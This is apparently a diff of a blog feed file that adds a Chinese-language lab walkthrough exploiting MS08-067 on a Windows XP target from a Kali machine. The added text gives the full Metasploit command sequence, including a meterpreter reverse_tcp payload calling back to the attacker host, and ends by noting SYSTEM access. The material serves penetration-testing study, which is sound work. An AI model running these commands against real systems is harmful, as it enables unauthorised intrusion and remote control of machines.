@@ -8,7 +8,7 @@
       <link href="/2019/12/06/MS08-067%E6%B8%97%E9%80%8F/"/>
       <url>/2019/12/06/MS08-067%E6%B8%97%E9%80%8F/</url>
       
-        <content type="html"><![CDATA[<hr><p>通过MS08_067学习msf对渗透的利用：（可攻击系统为xp和Windows2003）</p><p>​    靶机：Windows 2003 （192.168.157.131）</p><p>​    攻击机：Kali （192.168.157.132）</p><p>1.使用-p-对靶机进行扫描，查看有哪些端口漏洞(08_067对应的漏洞端口为445)</p>]]></content>
+        <content type="html"><![CDATA[<hr><p>通过MS08_067学习msf对渗透的利用：（可攻击系统为xp和Windows2003）</p><p>​    靶机：Windows xp （192.168.124.15）</p><p>​    攻击机：Kali （192.168.124.99）</p><p>1.使用-p-对靶机进行扫描，查看有哪些端口漏洞(08_067对应的漏洞端口为445)</p><p><img src="https://img.vim-cn.com/35/9f86370c1ecd0a4c69d7fcc4077b5040b9fd9f.png" alt="0"></p><p>2.输入msfconsole进入搜索MS08_067可利用漏洞模块</p><p><img src="https://img.vim-cn.com/87/d2e5060c076b7a604d6ac3591fb8f3176cf34d.png" alt="1"></p><p>3.利用漏洞模块，设置参数</p><p>msf5 &gt; use exploit/windows/smb/ms08_067_netapi</p><p>msf5 &gt; set RHOSTS 192.168.124.15</p><p>msf5 &gt; set payload windows/meterpreter/reverse_tcp</p><p>msf5 &gt; set LHOST 192.168.124.99</p><p>msf5 &gt; set target 34</p><p>msf5 &gt; exploit</p><p><img src="https://img.vim-cn.com/f3/78a38c95cbb937494fe1bc145ff2f3fff769c1.png" alt="2"></p><p>可以看到漏洞利用成功，现在是 system 最高权限,就可以对靶机进行为所欲为了</p>]]></content>
       
       
       
